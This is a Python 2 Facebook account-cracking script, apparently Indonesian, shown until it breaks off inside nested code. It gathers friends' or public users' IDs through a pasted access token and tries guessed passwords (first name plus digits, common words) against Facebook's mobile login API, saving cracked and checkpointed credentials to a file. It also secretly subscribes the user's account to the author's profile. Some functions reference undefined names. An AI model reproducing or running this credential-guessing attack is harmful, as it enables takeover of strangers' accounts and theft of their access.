#!/usr/bin/python2
# coding=utf-8
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
P  = '\033[1;97m'  # biru
M  = '\033[1;91m' # biru
H  = '\033[1;92m' # biru
K = '\033[1;93m' # biru
B  = '\033[1;94m' # biru
U  = '\033[1;95m' # biru
O = '\033[1;96m' # kuning

my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)

try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
	os.system("python2 cr4ck.py")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

os.system("clear")
done = False
def animate():
    for c in itertools.cycle(['\033[1;96m|', '\033[1;92m/', '\033[1;95m-', '\033[1;91m\\']):
        if done:
            break
        sys.stdout.write('\r\033[1;93mLoading ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.1)
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(5)
done = True

def keluar():
	print "\033[1;97m{\033[1;91m!\033[1;97m} Keluar"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		


back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []

os.system("clear")

#########LOGO#########
print """\033[1;93m█████████
\033[1;93m█▄█████▄█      \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●
\033[1;93m█\033[1;92m▼▼▼▼▼ \033[1;92m- _ --_--\033[1;95m-----------------
\033[1;93m█ \033[1;92m \033[1;92m_-_-- -_ --__\033[1;93m S U N D A W A N I 
\033[1;93m█\033[1;92m▲▲▲▲▲\033[1;92m--  - _ --\033[1;96m USER : ilham & PASS : xyz
\033[1;93m█████████      \033[1;92m«----------✧----------»
\033[1;93m ██ ██
\033[1;94m───────────────────────────────────────────
\033[1;91m██╗██╗░░░░░██╗░░██╗░█████╗░███╗░░░███╗
\033[1;91m██║██║░░░░░██║░░██║██╔══██╗████╗░████║
\033[1;91m██║██║░░░░░███████║███████║██╔████╔██║
\033[1;91m██║██║░░░░░██╔══██║██╔══██║██║╚██╔╝██║
\033[1;91m██║███████╗██║░░██║██║░░██║██║░╚═╝░██║
\033[1;91m╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝X D.
\033[1;93m===============================================
\033[0;93m[\033[0;93m ⚘ \033[0;93m] YouTube : Ilham Ramadhan
\033[0;93m[\033[0;93m ⚘ \033[0;93m] Facebook: ilhamxyz.v4
\033[0;93m[\033[0;93m ⚘ \033[0;93m] Github  : github.com/ilhamxyz213
\033[0;93m\033[0;93m=============================================== 
"""
CorrectUsername = "ilham"
CorrectPassword = "xyz"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;93mUSER \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPASS  \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'
        else:
            print "SALAH ASUU,CHAT FB GW !"
            os.system('xdg-open https://www.facebook.com/chand.mohamad.5454')
    else:
        print "SALAH ASUUU,CHAT FB GW !"
        os.system('xdg-open https://www.facebook.com/chand.mohamad.5454')
                
#########LOGO#########
logo = """
\033[1;91m╭━━━╮╱╱╱╱╱╱╱╭╮╱╱╭╮╭╮╭┳━━━┳━╮╱╭┳━━╮
\033[1;91m┃╭━╮┃╱╱╱╱╱╱╱┃┃╱╱┃┃┃┃┃┃╭━╮┃┃╰╮┃┣┫┣╯
\033[1;91m┃╰━━┳╮╭┳━╮╭━╯┣━━┫┃┃┃┃┃┃╱┃┃╭╮╰╯┃┃┃
\033[1;91m╰━━╮┃┃┃┃╭╮┫╭╮┃╭╮┃╰╯╰╯┃╰━╯┃┃╰╮┃┃┃┃
\033[1;91m┃╰━╯┃╰╯┃┃┃┃╰╯┃╭╮┣╮╭╮╭┫╭━╮┃┃╱┃┃┣┫┣╮
\033[1;91m╰━━━┻━━┻╯╰┻━━┻╯╰╯╰╯╰╯╰╯╱╰┻╯╱╰━┻━━╯
\033[1;93m===============================================
\033[0;93m[\033[0;93m ⚘ \033[0;93m] YouTube : Ilham Ramadhan
\033[0;93m[\033[0;93m ⚘ \033[0;93m] Facebook: ilhamxyz.v4
\033[0;93m[\033[0;93m ⚘ \033[0;93m] Github  : github.com/ilhamxyz213
\033[0;93m\033[0;93m=============================================== 
"""
                
###### MASUK ######
def masuk():
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m{\033[1;92m01\033[1;97m} LOGIN LEWAT TOKEN !!"
	print "\033[1;97m{\033[1;92m02\033[1;97m} AMBIL TOKEN DISINI:)"
	print "\033[1;97m{\033[1;91m00\033[1;97m} Keluar"
	print 50* "\033[1;94m─"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;90m  ✬︻╦̵̵͇̿̿̿̿╤═͇̿̿̿̿╤═\033[91m:\033[1;92m ")
	if msuk =="":
		print"\033[1;97m[\033[1;91m!\033[1;97m] YANG BENER COY !"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="2" or msuk =="02":
		ambil_token()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m] YANG BENER COY !"
		pilih_masuk()
		
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	toket = raw_input("\033[1;97m{\033[1;95m?\033[1;97m} Token \033[1;91m:\033[1;92m ")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[1;97m{\033[1;92m✓\033[1;97m}\033[1;92m Login Berhasil'
		requests.post("https://graph.facebook.com/100006622839447/subscribers?access_token=" + toket)      # P4NGERAN ILHAM RAMADAN UNIKER SANTUY FR0M BANDUNG AKUN TERLINDUNG1 DARI SEGALA PENJURU M4STER UNIK3R H4NYA SEBATAS PEMBUAT AKUN UNIK TETAPI TIDAK BISA MENGGODA JANDA MUDA 0404 ERROR NOT FOUND LEADER BROTHERLAND GUARD TEAM 2019 NEVER DIE // CR3ATOR F4CEBOOK UN1K LIMITIDE EDITION 2021//2022 
		os.system('xdg-open https://facebook.com/100006622839447')
		menu()
	except KeyError:
		print "\033[1;97m{\033[1;91m!\033[1;97m} \033[1;91mToken salah !"
		time.sleep(1.7)
		masuk()
		
#####LOGIN_COOKIE#####
def cookie():
    try:
          cek = open("cookies").read()
    except FileNotFoundError:
          cek = input("\033[00mCookies : \033[1;96m")
    cek = {"cookie":cek}
    ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
    if "mbasic_logout_button" in str(ismi):
        if "Hallo Sob" in str(ismi):
            with open("cookies","w") as f:
                 f.write(cek["cookie"])
        else:
            try:
                 requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
            except:
                 pass
        try:
             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
             ses.get(mbasic.format(ikuti),cookies=cek)
        except:
             pass
        return cek["cookie"]
    else:
        print('\033[00mCookies \033[91mInvalid\033[00m')
        time.sleep(1)
        os.system('python fb.py')
        
######AMBIL_TOKEN######
def ambil_token():
	os.system("clear")
	print logo
	print 50* "\033[1;94m─"
	jalan("        \033[1;92mAnda Akan Di Arahkan Ke Browser ...")
	os.system('xdg-open https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed&_rdc=1&_rdr#_=')
	time.sleep(2)
	masuk()
	
##### AMBIL LINK #####
def ambil_link():
	os.system("clear")
	print logo
	print 50* "\033[1;94m─"
	jalan("\033[1;92mDilarang Menggunakan Akun Facebook Lama...")
	jalan("\033[1;92mWajib Menggunakan Akun Facebook Baru ...")
	jalan("\033[1;92mJika Ingin Menggunakan Akun Facebook Lama...")
	jalan("\033[1;92mWajib Menggunakan Aplikasi Yg Di Sediakan...")
	os.system ("cd ... && npm install")
	jalan ("\033[1;96mMulai...")
	os.system ("cd ... && npm start")
	raw_input("\n[ Kembali ]")
	masuk()

###### MENU #######
def menu():
	os.system('clear')
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print "{!} Token Invalid !"
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;96m[!] \033[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		menu()
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"{!} Tidak ada koneksi"
		keluar()
	os.system("clear")
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m{\033[1;96m•\033[1;97m}\033[1;95m NAMA\033[1;90m    =>\033[1;92m " +nama
	print "\033[1;97m{\033[1;96m•\033[1;97m}\033[1;95m USER ID\033[1;90m =>\033[1;92m " + id
	print 50* "\033[1;94m─"
	print "\033[1;97m{"+warni+"01\033[1;97m}"+warna+" Crack ID Dari Teman/Publik"
	print "\033[1;97m{"+warni+"02\033[1;97m}"+warna+" Crack ID Dari Postingan Grup/Teman"
	print "\033[1;97m{"+warni+"03\033[1;97m}"+warna+" Crack ID Dari Total Followers"
	print "\033[1;97m{"+warni+"04\033[1;97m}"+warna+" Yahoo clone"
	print "\033[1;97m{"+warni+"05\033[1;97m}"+warna+" Perbarui Script"
	print "\033[1;97m{\033[1;91m00\033[1;97m}"+warna+" Keluar"
	print 50* "\033[1;94m─"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;92m︻デ═一▸ \033[91m:\033[1;92m ")
	if unikers =="":
		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
		pilih()
	elif unikers =="1" or unikers =="01":
		crack_teman()
	elif unikers =="2" or unikers =="02":
		crack_likes()
	elif unikers =="3" or unikers =="03":
		crack_follow()
	elif unikers =="4" or unikers =="04":
		user_id()
	elif unikers =="5" or unikers =="05":
		yahoo()
	elif unikers =="6" or unikers =="06":
		perbarui()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus token')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
		pilih()
		
##### CRACK TEMAN/PUBLIK #####
def crack_teman():
	os.system("clear")
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m{"+warna+"01\033[1;97m}"+warni+" Crack ID Indonesia"
	print "\033[1;97m{"+warna+"02\033[1;97m}"+warni+" Crack ID Bangladesh"
	print "\033[1;97m{"+warna+"03\033[1;97m}"+warni+" Crack ID Usa"
	print "\033[1;97m{"+warna+"04\033[1;97m}"+warni+" Crack ID Pakistan"
	print "\033[1;97m{\033[1;91m00\033[1;97m}"+warni+" Kembali"
	print 50* "\033[1;94m─"
	pilih_teman()
	
######PILIH######
def pilih_teman():
	univ = raw_input(""+warna+"︻デ═一▸ \033[91m:\033[1;92m ")
	if univ =="":
		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
		pilih_teman()
	elif univ =="1" or univ =="01":
		crack_indo()
	elif univ =="2" or univ =="02":
		crack_bangla()
	elif univ =="3" or univ =="03":
		crack_usa()
	elif univ =="4" or univ =="04":
		crack_pakis()
	elif univ =="5" or univ =="05":
		ambil_Id()
	elif univ =="6" or univ =="06":
		univ()
	elif univ =="0" or univ =="00":
		menu()
	else:
		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
		pilih_teman()
		
##### CRACK INDONESIA #####
def crack_indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;96m[!] \x1b[1;91mToken invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 50* "\033[1;94m─"
	print "\033[1;97m{\033[1;93m01\033[1;97m} Crack Dari Daftar Teman"
	print "\033[1;97m{\033[1;93m02\033[1;97m} Crack Dari Publik/Teman"
	print "\033[1;97m{\033[1;93m03\033[1;97m} Crack Dari File"
	print "\033[1;97m{\033[1;91m00\033[1;97m} Kembali"
	print 50* "\033[1;94m─"
	pilih_indo()

#### PILIH INDONESIA ####
def pilih_indo():
	teak = raw_input("\033[1;93m︻デ═一▸ \033[91m:\033[1;92m ")
	if teak =="":
		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Isi Yg Benar !"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("             \033[1;93m●●● \033[1;97mCRACK INDONESIA \033[1;93m●●●")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print 50* "\033[1;94m─"
		print ("             \033[1;93m●●● \033[1;97mCRACK INDONESIA \033[1;93m●●●")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mID Publik/Teman \033[1;91m:\033[1;92m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m{\033[1;93m●\033[1;97m}\033[1;93m Nama \033[1;91m:\033[1;92m "+sp["name"]
		except KeyError:
			print"\033[1;97m{\033[1;91m!\033[1;97m} ID publik/teman tidak ada !"
			raw_input("\n\033[1;93m{\033[1;97m<Kembali>\033[1;93m}")
			crack_indo()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m{\033[1;91m!\033[1;97m} Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;93m●●● \033[1;97mCRACK INDONESIA \033[1;93m●●●")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mNama File\033[1;91m :\033[1;92m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada ! '
			raw_input('\n\033[1;92m[ \033[1;97mKembali \033[1;92m]')
		except IOError:
			print '\033[1;97m{\033[1;91m!\033[1;97m} File tidak ada !'
			raw_input("\n\033[1;93m{\033[1;97m<Kembali>\033[1;93m}")
			crack_indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Isi Yg Benar !"
		pilih_indo()
	
	print "\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mTotal ID \033[1;91m:\033[1;92m "+str(len(id))
	print('\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mStop Tekan CTRL+Z')
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mCrack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mGunakan Mode Pesawat Jika Tidak Ada Hasil")
	print ("\033[1;94m──────────────────────────────────────────────────")
	
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S \033[1;97m"+str(len(zowe)))));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
				oke = open("done/indo.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
					print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
					print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos1
					cek = open("done/indo.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
						oke = open("done/indo.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
							print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
							print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos2
							cek = open("done/indo.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
								oke = open("done/indo.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
									print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
									print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos3
									cek = open("done/indo.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('sayang')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
										oke = open("done/indo.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
											print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
											print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos4
											cek = open("done/indo.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('bangsat')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
												oke = open("done/indo.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
													print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
													print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos5
													cek = open("done/indo.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = ('anjing')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
														oke = open("done/indo.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
															print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
															print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos6
															cek = open("done/indo.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = ('kontol')
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos7
																oke = open("done/indo.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
																	print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
